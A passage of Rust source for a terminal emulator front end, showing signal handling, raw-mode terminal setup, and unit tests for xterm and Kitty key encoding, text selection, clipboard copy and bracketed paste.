/// Install SIGINT/SIGTERM/SIGHUP handlers that only set `SIGNAL_REQUESTED_EXIT`.
/// Safe to call repeatedly; installation is once-only. No-op on non-Unix.
fn install_terminal_signal_handlers() {
    #[cfg(unix)]
    {
        static INSTALL: Once = Once::new();
        INSTALL.call_once(|| {
            let signals = [
                signal_hook::consts::SIGINT,
                signal_hook::consts::SIGTERM,
                signal_hook::consts::SIGHUP,
            ];
            for sig in signals {
                // SAFETY: closure only stores to `AtomicBool` (async-signal-safe).
                // No TTY I/O here — main loop exits and `TerminalGuard` Drop restores.
                let _ = unsafe {
                    signal_hook::low_level::register(sig, || {
                        SIGNAL_REQUESTED_EXIT.store(true, Ordering::SeqCst);
                    })
                };
            }
        });
    }
}

struct TerminalGuard;

impl TerminalGuard {
    fn enter() -> Result<Self> {
        // Raw mode + host alt-screen require a real interactive TTY. Captured
        // or piped stdio (CI, agents, `</dev/null`) fails with ENXIO otherwise.
        if !io::stdin().is_terminal() || !io::stdout().is_terminal() {
            bail!(
                "prismattyc needs an interactive terminal (stdin and stdout must be a TTY).\n\
                 Run it in a real terminal emulator, or under `script` / `ssh -t`.\n\
                 Example:  cargo run -p prismattyc --locked -- /bin/sh"
            );
        }
        // Install before raw/alt so a late SIGTERM during enter is cooperative.
        install_terminal_signal_handlers();
        enable_raw_mode().context("failed to enable raw terminal input")?;
        if let Err(error) = enter_host_modes(&mut io::stdout()) {
            let _ = disable_raw_mode();
            return Err(error).context("failed to enter the alternate screen");
        }
        HOST_TERMINAL_OWNED.store(true, Ordering::SeqCst);
        Ok(Self)
    }
}

impl Drop for TerminalGuard {
    fn drop(&mut self) {
        restore_host_terminal_once();
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use prismattyc_core::test_time_budget;
    use prismattyc_protocol::{
        encode_attach_cell_rect, encode_attach_viewport, encode_capability_query,
        encode_capability_reply, encode_detach, encode_semantic_copy, encode_semantic_snapshot,
        encode_update, AttachCellRect, AttachViewport, CapabilityQuery, ProtocolVersion, RequestId,
        SemanticCopy, SemanticDocument, SemanticRange, SemanticRole, SemanticSpan,
        UpdateAttachment,
    };
    use prismattyc_render::PlainTextRenderer;

    /// tests have no writer thread — apply grants from queued messages.
    fn test_apply_queued_capability_grants(
        rx: &mpsc::Receiver<ChildWrite>,
        rich: &mut RichSession,
    ) {
        while let Ok(msg) = rx.try_recv() {
            if let Some(grant) = msg.capability_grant {
                rich.apply_grant(grant);
            }
        }
    }

    #[test]
    fn encode_key_arrow_up_is_csi() {
        let key = KeyEvent::new(KeyCode::Up, KeyModifiers::NONE);
        assert_eq!(encode_key_to_pty(key, 0), Some(b"\x1b[A".to_vec()));
    }

    #[test]
    fn encode_key_alt_b_is_esc_b() {
        // readline Meta-b style: ESC then the character bytes.
        let key = KeyEvent::new(KeyCode::Char('b'), KeyModifiers::ALT);
        assert_eq!(encode_key_to_pty(key, 0), Some(b"\x1bb".to_vec()));
        let key_f = KeyEvent::new(KeyCode::Char('f'), KeyModifiers::ALT);
        assert_eq!(encode_key_to_pty(key_f, 0), Some(b"\x1bf".to_vec()));
        // Control still wins over Alt (Ctrl+B = STX, not Meta-b).
        let ctrl_b = KeyEvent::new(
            KeyCode::Char('b'),
            KeyModifiers::CONTROL | KeyModifiers::ALT,
        );
        assert_eq!(encode_key_to_pty(ctrl_b, 0), Some(vec![0x02]));
    }

    #[test]
    fn encode_key_f1_is_xterm_ss3() {
        let key = KeyEvent::new(KeyCode::F(1), KeyModifiers::NONE);
        assert_eq!(encode_key_to_pty(key, 0), Some(b"\x1bOP".to_vec()));
        let f5 = KeyEvent::new(KeyCode::F(5), KeyModifiers::NONE);
        assert_eq!(encode_key_to_pty(f5, 0), Some(b"\x1b[15~".to_vec()));
        let f12 = KeyEvent::new(KeyCode::F(12), KeyModifiers::NONE);
        assert_eq!(encode_key_to_pty(f12, 0), Some(b"\x1b[24~".to_vec()));
    }

    #[test]
    fn encode_key_ctrl_left_right_are_modified_csi() {
        let left = KeyEvent::new(KeyCode::Left, KeyModifiers::CONTROL);
        assert_eq!(encode_key_to_pty(left, 0), Some(b"\x1b[1;5D".to_vec()));
        let right = KeyEvent::new(KeyCode::Right, KeyModifiers::CONTROL);
        assert_eq!(encode_key_to_pty(right, 0), Some(b"\x1b[1;5C".to_vec()));
        // Plain arrows remain unmodified CSI.
        let plain = KeyEvent::new(KeyCode::Left, KeyModifiers::NONE);
        assert_eq!(encode_key_to_pty(plain, 0), Some(b"\x1b[D".to_vec()));
    }

    // remainder: Ctrl+Up/Down and Alt+arrows use xterm CSI 1;mod letter.
    #[test]
    fn encode_key_ctrl_up_down_and_alt_arrows() {
        let up = KeyEvent::new(KeyCode::Up, KeyModifiers::CONTROL);
        assert_eq!(encode_key_to_pty(up, 0), Some(b"\x1b[1;5A".to_vec()));
        let down = KeyEvent::new(KeyCode::Down, KeyModifiers::CONTROL);
        assert_eq!(encode_key_to_pty(down, 0), Some(b"\x1b[1;5B".to_vec()));
        let alt_left = KeyEvent::new(KeyCode::Left, KeyModifiers::ALT);
        assert_eq!(encode_key_to_pty(alt_left, 0), Some(b"\x1b[1;3D".to_vec()));
        // Ctrl+Alt+Right → mod 1+2+4 = 7
        let ctrl_alt_right =
            KeyEvent::new(KeyCode::Right, KeyModifiers::CONTROL | KeyModifiers::ALT);
        assert_eq!(
            encode_key_to_pty(ctrl_alt_right, 0),
            Some(b"\x1b[1;7C".to_vec())
        );
    }

    // remainder: modified Page/Home and F-keys.
    #[test]
    fn encode_key_ctrl_shift_letter_is_csi27() {
        let key = KeyEvent::new(
            KeyCode::Char('a'),
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        );
        // mod = 1+1+4 = 6; 'a' = 97
        assert_eq!(encode_key_to_pty(key, 0), Some(b"\x1b[27;6;97~".to_vec()));
    }

    #[test]
    fn encode_key_backtab_is_csi_z() {
        let key = KeyEvent::new(KeyCode::BackTab, KeyModifiers::SHIFT);
        assert_eq!(encode_key_to_pty(key, 0), Some(b"\x1b[Z".to_vec()));
    }

    #[test]
    fn encode_key_super_mod_in_arrow() {
        let key = KeyEvent::new(KeyCode::Left, KeyModifiers::SUPER);
        // mod = 1+8 = 9
        assert_eq!(encode_key_to_pty(key, 0), Some(b"\x1b[1;9D".to_vec()));
    }

    #[test]
    fn encode_key_modified_page_home_and_fkeys() {
        let pgup = KeyEvent::new(KeyCode::PageUp, KeyModifiers::CONTROL);
        assert_eq!(encode_key_to_pty(pgup, 0), Some(b"\x1b[5;5~".to_vec()));
        let home = KeyEvent::new(KeyCode::Home, KeyModifiers::CONTROL);
        assert_eq!(encode_key_to_pty(home, 0), Some(b"\x1b[1;5H".to_vec()));
        let plain_home = KeyEvent::new(KeyCode::Home, KeyModifiers::NONE);
        assert_eq!(encode_key_to_pty(plain_home, 0), Some(b"\x1b[H".to_vec()));
        let f5_ctrl = KeyEvent::new(KeyCode::F(5), KeyModifiers::CONTROL);
        assert_eq!(encode_key_to_pty(f5_ctrl, 0), Some(b"\x1b[15;5~".to_vec()));
        let f1_shift = KeyEvent::new(KeyCode::F(1), KeyModifiers::SHIFT);
        assert_eq!(encode_key_to_pty(f1_shift, 0), Some(b"\x1b[1;2P".to_vec()));
    }

    #[test]
    fn kitty_disambiguate_encodes_esc_and_ctrl_as_csi_u() {
        use prismattyc_emulator::KITTY_DISAMBIGUATE;
        let flags = KITTY_DISAMBIGUATE;
        let esc = KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE);
        assert_eq!(encode_key_to_pty(esc, flags), Some(b"\x1b[27u".to_vec()));
        let ctrl_c = KeyEvent::new(KeyCode::Char('c'), KeyModifiers::CONTROL);
        assert_eq!(
            encode_key_to_pty(ctrl_c, flags),
            Some(b"\x1b[99;5u".to_vec())
        );
        // Enter stays legacy for crash recovery under disambiguate-only.
        let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
        assert_eq!(encode_key_to_pty(enter, flags), Some(vec![b'\r']));
        // Plain text still UTF-8.
        let a = KeyEvent::new(KeyCode::Char('a'), KeyModifiers::NONE);
        assert_eq!(encode_key_to_pty(a, flags), Some(b"a".to_vec()));
    }

    #[test]
    fn kitty_report_all_encodes_plain_keys_as_csi_u() {
        use prismattyc_emulator::{KITTY_DISAMBIGUATE, KITTY_REPORT_ALL, KITTY_REPORT_TEXT};
        let flags = KITTY_DISAMBIGUATE | KITTY_REPORT_ALL;
        let a = KeyEvent::new(KeyCode::Char('a'), KeyModifiers::NONE);
        assert_eq!(encode_key_to_pty(a, flags), Some(b"\x1b[97u".to_vec()));
        let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
        assert_eq!(encode_key_to_pty(enter, flags), Some(b"\x1b[13u".to_vec()));
        let flags_text = flags | KITTY_REPORT_TEXT;
        let a2 = KeyEvent::new(KeyCode::Char('a'), KeyModifiers::NONE);
        assert_eq!(
            encode_key_to_pty(a2, flags_text),
            Some(b"\x1b[97;1;97u".to_vec())
        );
    }

    #[test]
    fn kitty_event_types_encode_repeat_and_release() {
        use prismattyc_emulator::{KITTY_DISAMBIGUATE, KITTY_EVENT_TYPES, KITTY_REPORT_ALL};
        let flags = KITTY_DISAMBIGUATE | KITTY_EVENT_TYPES | KITTY_REPORT_ALL;
        let mut rep = KeyEvent::new(KeyCode::Char('w'), KeyModifiers::NONE);
        rep.kind = KeyEventKind::Repeat;
        assert_eq!(
            encode_key_to_pty(rep, flags),
            Some(b"\x1b[119;1:2u".to_vec())
        );
        let mut rel = KeyEvent::new(KeyCode::Char('w'), KeyModifiers::NONE);
        rel.kind = KeyEventKind::Release;
        assert_eq!(
            encode_key_to_pty(rel, flags),
            Some(b"\x1b[119;1:3u".to_vec())
        );
    }

    /// PT-153: table over `encode_key_kitty_functional_or_u` — every arm,
    /// the plain-vs-modified form switch, and the event-type subfield.
    #[test]
    fn kitty_functional_keys_table_covers_every_arm() {
        let enc = |code: KeyCode, mods: KeyModifiers, event_type: u8, event_types: bool| {
            encode_key_kitty_functional_or_u(
                KeyEvent::new(code, mods),
                event_type,
                event_types,
                false,
                false,
            )
        };
        let none = KeyModifiers::NONE;
        // Plain presses use the short legacy forms.
        for (code, want) in [
            (KeyCode::Up, "\x1b[A"),
            (KeyCode::Down, "\x1b[B"),
            (KeyCode::Right, "\x1b[C"),
            (KeyCode::Left, "\x1b[D"),
            (KeyCode::Home, "\x1b[H"),
            (KeyCode::End, "\x1b[F"),
            (KeyCode::PageUp, "\x1b[5~"),
            (KeyCode::PageDown, "\x1b[6~"),
            (KeyCode::Delete, "\x1b[3~"),
            (KeyCode::Insert, "\x1b[2~"),
        ] {
            assert_eq!(
                enc(code, none, 1, false),
                Some(want.as_bytes().to_vec()),
                "{code:?}"
            );
        }
        // Modified presses carry the xterm modifier parameter (Shift 2, Alt 3, Ctrl 5).
        assert_eq!(
            enc(KeyCode::Up, KeyModifiers::SHIFT, 1, false),
            Some(b"\x1b[1;2A".to_vec())
        );
        assert_eq!(
            enc(KeyCode::Home, KeyModifiers::CONTROL, 1, false),
            Some(b"\x1b[1;5H".to_vec())
        );
        assert_eq!(
            enc(KeyCode::End, KeyModifiers::ALT, 1, false),
            Some(b"\x1b[1;3F".to_vec())
        );
        assert_eq!(
            enc(KeyCode::PageUp, KeyModifiers::ALT, 1, false),
            Some(b"\x1b[5;3~".to_vec())
        );
        assert_eq!(
            enc(KeyCode::Delete, KeyModifiers::SHIFT, 1, false),
            Some(b"\x1b[3;2~".to_vec())
        );
        assert_eq!(
            enc(
                KeyCode::Insert,
                KeyModifiers::CONTROL | KeyModifiers::SHIFT,
                1,
                false
            ),
            Some(b"\x1b[2;6~".to_vec())
        );
        // F-keys: plain falls through to the legacy encoder (SS3 for F1-F4,
        // CSI ~ for F5-F12); modified uses CSI 1;mod P..S and CSI n;mod ~.
        assert_eq!(enc(KeyCode::F(1), none, 1, false), Some(b"\x1bOP".to_vec()));
        assert_eq!(enc(KeyCode::F(4), none, 1, false), Some(b"\x1bOS".to_vec()));
        assert_eq!(
            enc(KeyCode::F(5), none, 1, false),
            Some(b"\x1b[15~".to_vec())
        );
        for (n, want) in [
            (1, "\x1b[1;5P"),
            (2, "\x1b[1;5Q"),
            (3, "\x1b[1;5R"),
            (4, "\x1b[1;5S"),
            (5, "\x1b[15;5~"),
            (6, "\x1b[17;5~"),
            (7, "\x1b[18;5~"),
            (8, "\x1b[19;5~"),
            (9, "\x1b[20;5~"),
            (10, "\x1b[21;5~"),
            (11, "\x1b[23;5~"),
            (12, "\x1b[24;5~"),
        ] {
            assert_eq!(
                enc(KeyCode::F(n), KeyModifiers::CONTROL, 1, false),
                Some(want.as_bytes().to_vec()),
                "ctrl+F{n}"
            );
        }
        // Keys this encoder does not own return None so the caller can fall back.
        assert_eq!(enc(KeyCode::F(13), none, 1, false), None);
        assert_eq!(enc(KeyCode::Char('a'), none, 1, false), None);
        assert_eq!(enc(KeyCode::Enter, none, 1, false), None);
        assert_eq!(enc(KeyCode::Tab, KeyModifiers::SHIFT, 1, false), None);
    }

    /// PT-153: with event types enabled a plain press keeps the long form
    /// (`1;1`), and repeat/release add the `:2` / `:3` subfield on arrows,
    /// tilde keys, and both F-key shapes.
    #[test]
    fn kitty_functional_keys_carry_event_type_subfields() {
        let enc = |code: KeyCode, mods: KeyModifiers, event_type: u8| {
            encode_key_kitty_functional_or_u(
                KeyEvent::new(code, mods),
                event_type,
                true,
                false,
                false,
            )
        };
        let none = KeyModifiers::NONE;
        assert_eq!(
            enc(KeyCode::Up, none, 1),
            Some(b"\x1b[1;1A".to_vec()),
            "press keeps mods=1"
        );
        assert_eq!(
            enc(KeyCode::Up, none, 2),
            Some(b"\x1b[1;1:2A".to_vec()),
            "repeat"
        );
        assert_eq!(
            enc(KeyCode::Up, none, 3),
            Some(b"\x1b[1;1:3A".to_vec()),
            "release"
        );
        assert_eq!(
            enc(KeyCode::PageDown, none, 3),
            Some(b"\x1b[6;1:3~".to_vec())
        );
        assert_eq!(
            enc(KeyCode::Delete, KeyModifiers::SHIFT, 2),
            Some(b"\x1b[3;2:2~".to_vec())
        );
        assert_eq!(
            enc(KeyCode::F(1), none, 1),
            Some(b"\x1b[1;1P".to_vec()),
            "F1 press under event types is CSI, not SS3"
        );
        assert_eq!(enc(KeyCode::F(1), none, 3), Some(b"\x1b[1;1:3P".to_vec()));
        assert_eq!(
            enc(KeyCode::F(12), KeyModifiers::ALT, 3),
            Some(b"\x1b[24;3:3~".to_vec())
        );
        assert_eq!(enc(KeyCode::F(13), none, 3), None);
    }

    /// PT-153: the public entry point routes functional keys to this encoder
    /// under every Kitty flag set that reaches it.
    #[test]
    fn kitty_flags_route_functional_keys_through_the_functional_encoder() {
        use prismattyc_emulator::{KITTY_DISAMBIGUATE, KITTY_EVENT_TYPES, KITTY_REPORT_ALL};
        let up_shift = KeyEvent::new(KeyCode::Up, KeyModifiers::SHIFT);
        assert_eq!(
            encode_key_to_pty(up_shift, KITTY_DISAMBIGUATE),
            Some(b"\x1b[1;2A".to_vec())
        );
        assert_eq!(
            encode_key_to_pty(up_shift, KITTY_DISAMBIGUATE | KITTY_REPORT_ALL),
            Some(b"\x1b[1;2A".to_vec())
        );
        let mut f5_release = KeyEvent::new(KeyCode::F(5), KeyModifiers::NONE);
        f5_release.kind = KeyEventKind::Release;
        assert_eq!(
            encode_key_to_pty(
                f5_release,
                KITTY_DISAMBIGUATE | KITTY_REPORT_ALL | KITTY_EVENT_TYPES
            ),
            Some(b"\x1b[15;1:3~".to_vec())
        );
    }

    #[test]
    fn selection_copy_path_extracts_plain_text() {
        let mut emulator = Emulator::new(5, 1, 0);
        let _ = emulator.feed(b"hello");
        let mut selection = Selection::default();
        selection.begin(0, 0);
        selection.update(0, 4);
        selection.finish();
        let text = emulator
            .screen()
            .extract_text(selection.range().expect("range"));
        assert_eq!(text, "hello");
        let osc = encode_osc52_clipboard(&text).expect("valid plain text");
        assert!(osc.starts_with(b"\x1b]52;c;"));
    }

    #[test]
    fn shift_arrow_starts_viewport_keyboard_selection() {
        let mut emulator = Emulator::new(8, 2, 0);
        let _ = emulator.feed(b"abcd");
        // Caret at (0,4); Shift+Left should select column 3.
        let mut selection = Selection::default();
        let mut view_scroll = 0usize;
        assert!(extend_selection_keyboard(
            &mut selection,
            &emulator,
            KeyCode::Left,
            &mut view_scroll,
        ));
        assert!(selection.dragged);
        let range = selection.range().expect("range");
        assert_eq!(range.start_col, 3);
        assert_eq!(range.end_col, 4);
    }

    #[test]
    fn is_selection_motion_detects_shift_and_mode() {
        let key = KeyEvent::new(KeyCode::Left, KeyModifiers::SHIFT);
        assert!(is_selection_motion(key, false));
        let plain = KeyEvent::new(KeyCode::Left, KeyModifiers::NONE);
        assert!(!is_selection_motion(plain, false));
        assert!(is_selection_motion(plain, true), "mode allows plain arrows");
        let shift_ctrl_up = KeyEvent::new(KeyCode::Up, KeyModifiers::SHIFT | KeyModifiers::CONTROL);
        assert!(is_selection_motion(shift_ctrl_up, false));
        let shift_home = KeyEvent::new(KeyCode::Home, KeyModifiers::SHIFT);
        assert!(is_selection_motion(shift_home, false));
        let plain_end = KeyEvent::new(KeyCode::End, KeyModifiers::NONE);
        assert!(!is_selection_motion(plain_end, false));
        assert!(is_selection_motion(plain_end, true));
    }

    #[test]
    fn extend_selection_home_end_and_page() {
        let mut emulator = Emulator::new(10, 6, 0);
        let _ = emulator.feed(b"abcdefghij");
        let mut selection = Selection::default();
        let mut view_scroll = 0usize;
        selection.begin(2, 5);
        selection.dragged = true;
        assert!(extend_selection_keyboard(
            &mut selection,
            &emulator,
            KeyCode::Home,
            &mut view_scroll,
        ));
        let r = selection.range().expect("range");
        assert_eq!(r.start_col.min(r.end_col), 0);
        assert!(extend_selection_keyboard(
            &mut selection,
            &emulator,
            KeyCode::End,
            &mut view_scroll,
        ));
        let r = selection.range().expect("range");
        assert_eq!(r.start_col.max(r.end_col), 9);
        selection.begin(5, 0);
        selection.dragged = true;
        assert!(extend_selection_keyboard(
            &mut selection,
            &emulator,
            KeyCode::PageUp,
            &mut view_scroll,
        ));
        let r = selection.range().expect("range");
        assert_eq!(r.start_row.min(r.end_row), 0);
    }

    #[test]
    fn select_all_chord_selects_viewport_without_forwarding() {
        let mut emulator = Emulator::new(4, 3, 0);
        let _ = emulator.feed(b"ab");
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let mut find = FindMode::default();
        let key = KeyEvent::new(
            KeyCode::Char('a'),
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        );
        assert!(is_select_all_chord(key));
        let paint = handle_host_key(
            key,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .expect("ok");
        assert!(paint);
        assert!(mode);
        let r = selection.range().expect("viewport abs");
        // No scrollback: absolute rows match viewport 0..2.
        assert_eq!((r.start_row, r.start_col), (0, 0));
        assert_eq!((r.end_row, r.end_col), (2, 3));
        assert!(rx.try_recv().is_err(), "must not forward Ctrl+Shift+A");
        // Plain Ctrl+A is NOT select-all (readline BOL / child).
        let ctrl_a = KeyEvent::new(KeyCode::Char('a'), KeyModifiers::CONTROL);
        assert!(!is_select_all_chord(ctrl_a));
    }

    #[test]
    fn handle_host_key_shift_left_does_not_forward_to_child() {
        let emulator = Emulator::new(8, 1, 0);
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let mut find = FindMode::default();
        let key = KeyEvent::new(KeyCode::Left, KeyModifiers::SHIFT);
        let paint = handle_host_key(
            key,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .expect("ok");
        assert!(paint, "shift+left should request repaint");
        assert!(selection.range().is_some(), "selection should exist");
        assert!(mode, "select mode should engage");
        assert!(
            rx.try_recv().is_err(),
            "must not forward shift+left to child"
        );
    }

    #[test]
    fn multi_click_cycles_one_two_three() {
        let mut mc = MultiClick::default();
        assert_eq!(mc.on_left_down(0, 1), 1);
        assert_eq!(mc.on_left_down(0, 1), 2);
        assert_eq!(mc.on_left_down(0, 1), 3);
        assert_eq!(mc.on_left_down(0, 1), 1);
        assert_eq!(mc.on_left_down(1, 1), 1, "different cell resets");
    }

    fn left_drag(column: u16, row: u16) -> MouseEvent {
        MouseEvent {
            kind: MouseEventKind::Drag(MouseButton::Left),
            column,
            row,
            modifiers: KeyModifiers::NONE,
        }
    }

    fn left_down(column: u16, row: u16) -> MouseEvent {
        MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column,
            row,
            modifiers: KeyModifiers::NONE,
        }
    }

    /// clear-on-output mid-drag must not leave dragged-without-anchor;
    /// the next Drag restarts the gesture so a range can form again.
    #[test]
    fn drag_after_clear_restarts_selection_gesture() {
        let emulator = Emulator::new(10, 4, 0);
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut multi_click = MultiClick::default();
        let mut edge_pan = EdgePanDrag::default();
        let mut selection = Selection::default();
        let mut mode = false;
        let mut view_scroll = 0usize;

        // Normal begin + drag.
        handle_mouse(
            left_down(0, 0),
            &mut selection,
            &mut multi_click,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .expect("down");
        handle_mouse(
            left_drag(3, 0),
            &mut selection,
            &mut multi_click,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .expect("drag");
        assert!(selection.range().is_some());
        assert!(selection.anchor.is_some());

        // Simulate clear-on-output while button is still held.
        selection.clear();
        assert!(selection.anchor.is_none());
        assert!(!selection.dragged);
        assert!(selection.range().is_none());

        // Next Drag must restart (begin at current cell), not set half-dead dragged.
        handle_mouse(
            left_drag(2, 1),
            &mut selection,
            &mut multi_click,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .expect("drag after clear");
        assert!(selection.anchor.is_some(), "restart must restore anchor");
        assert!(selection.dragged);
        assert!(
            selection.range().is_some(),
            "restarted drag is paintable at the restart cell"
        );

        // Further drag extends the free end from the restart anchor.
        handle_mouse(
            left_drag(7, 1),
            &mut selection,
            &mut multi_click,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .expect("extend");
        let range = selection.range().expect("extended range");
        assert_eq!(range.start_row, 1);
        assert_eq!(range.start_col, 2);
        assert_eq!(range.end_row, 1);
        assert_eq!(range.end_col, 7);
    }

    /// Pure Selection::update without begin (host bug residual) never invents a range.
    #[test]
    fn selection_update_after_clear_without_begin_has_no_range() {
        let mut selection = Selection::default();
        selection.begin(0, 0);
        selection.update(0, 4);
        selection.clear();
        selection.update(1, 2);
        // Old host Drag path would then force dragged=true with no anchor.
        selection.dragged = true;
        assert!(
            selection.range().is_none(),
            "dragged without anchor must yield no range"
        );
    }

    #[test]
    fn is_copy_chord_ctrl_shift_c_and_ctrl_c_with_selection() {
        let csc = KeyEvent::new(
            KeyCode::Char('c'),
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        );
        assert!(is_copy_chord(csc, false));
        assert!(is_copy_chord(csc, true));
        let cc = KeyEvent::new(KeyCode::Char('c'), KeyModifiers::CONTROL);
        assert!(
            !is_copy_chord(cc, false),
            "Ctrl+C without selection is interrupt"
        );
        assert!(is_copy_chord(cc, true), "Ctrl+C with selection copies");
        let plain = KeyEvent::new(KeyCode::Char('c'), KeyModifiers::NONE);
        assert!(!is_copy_chord(plain, true));
    }

    /// never default to a shared fixed `/tmp/prism-keys.log`.
    #[test]
    fn key_debug_log_path_prefers_explicit_then_xdg_runtime() {
        // Isolate from the ambient environment for this process.
        env::remove_var("PRISMATTYC_KEY_DEBUG_PATH");
        env::remove_var("XDG_RUNTIME_DIR");
        env::remove_var("TMPDIR");
        env::remove_var("USER");

        env::set_var("PRISMATTYC_KEY_DEBUG_PATH", "/var/tmp/custom-keys.log");
        assert_eq!(
            key_debug_log_path(),
            std::path::PathBuf::from("/var/tmp/custom-keys.log")
        );
        env::remove_var("PRISMATTYC_KEY_DEBUG_PATH");

        env::set_var("XDG_RUNTIME_DIR", "/run/user/1000");
        let p = key_debug_log_path();
        let s = p.to_string_lossy();
        assert!(
            s.starts_with("/run/user/1000/prism/keys-") && s.ends_with(".log"),
            "expected runtime path, got {s}"
        );
        env::remove_var("XDG_RUNTIME_DIR");

        env::set_var("TMPDIR", "/tmp");
        env::set_var("USER", "brandan");
        let p = key_debug_log_path();
        let s = p.to_string_lossy();
        assert!(
            s.starts_with("/tmp/prism-keys-brandan-") && s.ends_with(".log"),
            "expected per-user tmp path, got {s}"
        );
        assert_ne!(
            p,
            std::path::PathBuf::from("/tmp/prism-keys.log"),
            "must not use fixed shared path"
        );
    }

    #[test]
    fn handle_host_key_ctrl_c_with_selection_does_not_forward() {
        let mut emulator = Emulator::new(8, 1, 0);
        let _ = emulator.feed(b"hello");
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        selection.begin(0, 0);
        selection.update(0, 4);
        selection.finish();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let mut find = FindMode::default();
        let key = KeyEvent::new(KeyCode::Char('c'), KeyModifiers::CONTROL);
        handle_host_key(
            key,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .expect("ok");
        assert!(
            rx.try_recv().is_err(),
            "Ctrl+C with selection must not send ^C to child"
        );
    }

    /// Dual-sign review FAIL @ 5f5cd42: jump-to-live must not run before copy.
    #[test]
    fn scrolled_ctrl_c_with_history_selection_copies_not_interrupt() {
        let mut emulator = Emulator::new(8, 3, 100);
        for i in 0..20 {
            let _ = emulator.feed(format!("line{i:02}abcd\n").as_bytes());
        }
        let max = emulator.screen().max_view_scroll();
        assert!(max > 0, "need scrollback");
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        // Multi-cell selection in the scrolled viewport.
        selection.begin(0, 0);
        selection.update(0, 5);
        selection.finish();
        assert!(selection_claims_ctrl_c(&selection));
        let mut mode = false;
        let mut view_scroll = max.clamp(1, 5);
        let mut find = FindMode::default();
        let key = KeyEvent::new(KeyCode::Char('c'), KeyModifiers::CONTROL);
        handle_host_key(
            key,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .expect("ok");
        assert!(
            rx.try_recv().is_err(),
            "scrolled Ctrl+C with multi-cell selection must not send ETX"
        );
        assert!(
            view_scroll > 0,
            "copy must preserve view_scroll for extract_text_view"
        );
        assert!(
            selection.range().is_some(),
            "copy must not clear the selection"
        );
    }

    #[test]
    fn scrolled_ctrl_shift_c_preserves_scroll_and_selection() {
        let mut emulator = Emulator::new(8, 3, 100);
        for i in 0..20 {
            let _ = emulator.feed(format!("line{i:02}abcd\n").as_bytes());
        }
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        selection.begin(1, 0);
        selection.update(1, 4);
        selection.finish();
        let mut mode = false;
        let mut view_scroll = 3usize;
        let mut find = FindMode::default();
        let key = KeyEvent::new(
            KeyCode::Char('c'),
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        );
        handle_host_key(
            key,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .expect("ok");
        assert!(rx.try_recv().is_err());
        assert_eq!(view_scroll, 3);
        assert!(selection.range().is_some());
    }

    #[test]
    fn scrolled_esc_clears_selection_without_jumping_live() {
        let mut emulator = Emulator::new(8, 3, 100);
        for i in 0..20 {
            let _ = emulator.feed(format!("line{i}\n").as_bytes());
        }
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        selection.begin(0, 0);
        selection.update(0, 3);
        selection.finish();
        let mut mode = true;
        let mut view_scroll = 4usize;
        let mut find = FindMode::default();
        let key = KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE);
        assert!(handle_host_key(
            key,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx
        )
        .unwrap());
        assert!(selection.range().is_none());
        assert!(!mode);
        assert_eq!(view_scroll, 4, "Esc clears selection, stays scrolled");
        assert!(rx.try_recv().is_err());
    }

    #[test]
    fn ctrl_space_then_arrow_selects_without_shift() {
        let mut emulator = Emulator::new(8, 1, 0);
        let _ = emulator.feed(b"hello");
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let mut find = FindMode::default();
        let mark = KeyEvent::new(KeyCode::Char(' '), KeyModifiers::CONTROL);
        assert!(handle_host_key(
            mark,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx
        )
        .unwrap());
        assert!(mode);
        let left = KeyEvent::new(KeyCode::Left, KeyModifiers::NONE);
        assert!(handle_host_key(
            left,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx
        )
        .unwrap());
        assert!(selection.range().is_some());
        assert!(
            rx.try_recv().is_err(),
            "arrows in select mode stay host-local"
        );
    }

    #[test]
    fn paste_wraps_when_bracketed_mode_on() {
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        assert_eq!(handle_paste("hi", true, &tx), PasteEnqueueResult::Queued);
        let bytes = rx.try_recv().expect("paste");
        assert_eq!(&bytes[..6], b"\x1b[200~");
        assert!(bytes.windows(6).any(|w| w == b"\x1b[201~"));
        assert!(bytes.windows(2).any(|w| w == b"hi"));
